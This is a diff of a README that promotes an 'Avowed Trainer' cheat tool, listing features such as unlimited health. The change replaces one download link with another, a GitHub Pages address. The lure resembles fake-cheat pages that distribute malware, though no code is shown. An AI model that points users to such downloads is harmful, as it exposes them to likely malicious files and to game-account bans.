@@ -1,6 +1,6 @@
 Avowed Trainer is an unauthorized cheat tool designed for the game *Avowed*. It provides players with various in-game advantages, such as **unlimited health**, **resources**, and **enhanced abilities**, allowing them to bypass certain challenges or speed up their progression. These trainers typically modify the game's code or use exploits to give players an edge over others, making gameplay easier or more convenient. While they can be appealing for players looking to enjoy a more relaxed experience, using trainers can violate the game’s terms of service and lead to penalties, including account bans.
 
-[![Download Avowed Trainer](https://img.shields.io/badge/Download-Avowed%20Trainer-blueviolet)](https://downloadifiles.com/?label=1e88dd1be7cebcac3b93ae91dcb2375f)
+[![Download Avowed Trainer](https://img.shields.io/badge/Download-Avowed%20Trainer-blueviolet)](https://avowed-trainer-download.github.io/.github/)
 
 **Key Features of Avowed Trainer:**
 - **Unlimited Health:** Makes the player invincible, preventing damage from enemies or environmental hazards.
